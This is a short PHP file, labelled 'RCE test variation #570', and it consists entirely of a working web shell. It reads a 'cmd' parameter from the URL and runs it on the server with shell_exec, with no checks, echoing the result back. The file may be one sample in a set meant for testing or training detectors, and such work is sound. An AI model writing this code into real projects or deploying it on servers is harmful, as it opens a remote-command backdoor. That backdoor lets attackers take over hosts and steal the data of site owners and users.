<?php
// RCE test variation #570
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>